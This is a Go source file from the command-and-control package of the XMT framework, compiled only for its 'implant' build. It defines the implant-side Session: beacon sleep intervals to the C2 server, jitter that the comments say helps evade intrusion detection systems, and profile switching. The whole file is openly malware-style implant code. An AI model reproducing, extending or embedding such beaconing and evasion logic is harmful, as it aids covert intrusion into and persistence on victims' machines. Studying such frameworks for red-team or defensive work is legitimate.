//go:build implant

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package c2

import (
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Job is a struct that is used to track and manage Tasks given to Session
// Clients.
//
// This struct has function callbacks that can be used to watch for completion
// and offers a Wait function to pause execution until a response is received.
//
// This struct is always empty for implants.
type Job struct{}

// Session is a struct that represents a connection between the client and the
// Listener.
//
// This struct does some automatic handeling and acts as the communication
// channel between the client and server.
type Session struct {
	lock   sync.RWMutex
	keyNew *data.Key

	Last    time.Time
	Created time.Time
	connection

	swap            Profile
	ch, wake        chan struct{}
	parent          *Listener
	send, recv, chn chan *com.Packet
	frags           map[uint16]*cluster

	Shutdown func(*Session)
	Receive  func(*Session, *com.Packet)
	proxy    *proxyBase
	tick     *time.Ticker
	peek     *com.Packet
	host     container

	Device device.Machine
	sleep  time.Duration
	state  state
	key    data.Key

	ID             device.ID
	jitter, errors uint8
}

// IsClient returns true when this Session is not associated to a Listener on
// this end, which signifies that this session is Client initiated or we are
// on a client device.
func (*Session) IsClient() bool {
	return true
}
func (*Session) accept(_ uint16) {}

// Listener will return the Listener that created the Session. This will return
// nil if the session is not on the server side.
func (*Session) Listener() *Listener {
	return nil
}
func (*Session) frag(_, _, _, _ uint16) {}
func (*Session) handle(_ *com.Packet) bool {
	return false
}

// SetJitter sets Jitter percentage of the Session's wake interval. This is a 0
// to 100 percentage (inclusive) that will determine any +/- time is added to
// the waiting period. This assists in evading IDS/NDS devices/systems.
//
// A value of 0 will disable Jitter and any value over 100 will set the value to
// 100, which represents using Jitter 100% of the time.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet.
func (s *Session) SetJitter(j int) (*Job, error) {
	return s.SetDuration(0, j)
}

// SetProfile will set the Profile used by this Session. This function will
// ensure that the profile is marshalable before setting and will then pass it
// to be set by the client Session (if this isn't one already).
//
// If this is a server-side Session, this will trigger the sending of a MvProfile
// Packet to update the client-side instance, which will update on it's next
// wakeup cycle.
//
// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
// setting the Profile and indicates that no Packet will be sent and that the
// Job object result is nil.
func (s *Session) SetProfile(p Profile) (*Job, error) {
	if p == nil {
		return nil, ErrInvalidProfile
	}
	s.p = p
	return nil, nil
}

// SetSleep sets the wake interval period for this Session. This is the time value
// between connections to the C2 Server.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet. This setting does not affect Jitter.
func (s *Session) SetSleep(t time.Duration) (*Job, error) {
	return s.SetDuration(t, -1)
}

// SetProfileBytes will set the Profile used by this Session. This function will
// unmarshal and set the server-side before setting and will then pass it to be
// set by the client Session (if this isn't one already).
//
// If this is a server-side Session, this will trigger the sending of a MvProfile
// Packet to update the client-side instance, which will update on it's next
// wakeup cycle.
//
// This function will fail if no ProfileParser is set.
//
// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
// setting the Profile and indicates that no Packet will be sent and that the
// Job object result is nil.
func (s *Session) SetProfileBytes(b []byte) (*Job, error) {
	if ProfileParser == nil {
		return nil, xerr.Sub("no Profile parser loaded", 0x44)
	}
	p, err := ProfileParser(b)
	if err != nil {
		return nil, xerr.Wrap("parse Profile", err)
	}
	s.p = p
	return nil, nil
}

// SetDuration sets the wake interval period and Jitter for this Session. This is
// the time value between connections to the C2 Server.
//
// Jitter is a 0 to 100 percentage (inclusive) that will determine any +/- time
// is added to the waiting period. This assists in evading IDS/NDS devices/systems.
//
// A value of 0 will disable Jitter and any value over 100 will set the value to
// 100, which represents using Jitter 100% of the time.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet.
func (s *Session) SetDuration(t time.Duration, j int) (*Job, error) {
	switch {
	case j == -1:
	case j < 0:
		s.jitter = 0
	case j > 100:
		s.jitter = 100
	default:
		s.jitter = uint8(j)
	}
	if t > 0 {
		s.sleep = t
	}
	return nil, nil
}
